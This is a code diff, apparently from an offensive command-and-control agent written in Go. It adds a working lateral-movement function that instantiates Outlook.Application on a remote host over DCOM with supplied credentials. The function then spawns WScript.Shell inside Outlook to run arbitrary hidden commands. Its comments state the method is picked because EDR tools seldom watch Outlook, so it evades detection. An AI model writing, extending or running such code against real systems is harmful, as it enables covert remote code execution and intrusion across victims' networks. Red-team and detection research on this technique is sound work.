@@ -345,6 +345,70 @@ func dcomExcelRegisterXLL(excel *ole.IDispatch, args dcomArgs, credInfo string) 
 	return successf("DCOM Excel.Application executed on %s:\n  DLL loaded: %s\n  Method: Excel.Application.RegisterXLL\n  Note: DLL loaded into Excel.exe process on target%s", args.Host, args.Command, credInfo)
 }
 
+// dcomExecOutlook executes a command via Outlook.Application DCOM object.
+// Technique: Create Outlook.Application on remote host, then use CreateObject("Wscript.Shell")
+// to obtain a WScript.Shell reference within Outlook's process context, then call .Run().
+// This is an unusual lateral movement vector — EDR tools typically don't monitor Outlook
+// for shell execution, making it less likely to be detected than MMC20 or ShellWindows.
+// Requires Outlook to be installed on the target.
+func dcomExecOutlook(args dcomArgs) structs.CommandResult {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
+	if err != nil {
+		oleErr, ok := err.(*ole.OleError)
+		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
+			return errorf("CoInitializeEx failed: %v", err)
+		}
+	}
+	defer ole.CoUninitialize()
+
+	domain, username, password, hasCreds := resolveCredentials(args)
+	defer structs.ZeroString(&password)
+	credInfo := ""
+	if hasCreds {
+		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
+	}
+
+	outlook, authState, err := createRemoteCOM(args.Host, clsidOutlookApp, domain, username, password)
+	if err != nil {
+		hint := ""
+		if !hasCreds {
+			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
+		}
+		return errorf("Failed to create Outlook.Application on %s: %v\n  Note: Outlook must be installed on the target%s", args.Host, err, hint)
+	}
+	defer outlook.Release()
+	defer authState.cleanup()
+
+	// Use Outlook's CreateObject to instantiate WScript.Shell inside Outlook's process
+	wshResult, err := oleutil.CallMethod(outlook, "CreateObject", "Wscript.Shell")
+	if err != nil {
+		return errorf("Outlook.CreateObject(\"Wscript.Shell\") failed: %v\n  Outlook's security settings may block CreateObject", err)
+	}
+	defer wshResult.Clear()
+	wsh := wshResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(wsh)
+	}
+
+	// Build the full command string
+	fullCmd := args.Command
+	if args.Args != "" {
+		fullCmd += " " + args.Args
+	}
+
+	// Run(strCommand, intWindowStyle, bWaitOnReturn)
+	// WindowStyle 0 = SW_HIDE, WaitOnReturn false = async
+	_, err = oleutil.CallMethod(wsh, "Run", fullCmd, 0, false)
+	if err != nil {
+		return errorf("Outlook WScript.Shell.Run failed: %v", err)
+	}
+
+	return successf("DCOM Outlook.Application executed on %s:\n  Command: %s\n  Method: Outlook.Application.CreateObject(\"Wscript.Shell\").Run\n  Note: Command runs inside Outlook.exe process context — less commonly monitored by EDR%s", args.Host, fullCmd, credInfo)
+}
+
 // dcomExcelDDEInitiate executes a command via DDE channel through Excel.
 // Uses DDEInitiate to open a channel to cmd.exe, then DDEExecute to run the command.
 func dcomExcelDDEInitiate(excel *ole.IDispatch, args dcomArgs, credInfo string) structs.CommandResult {
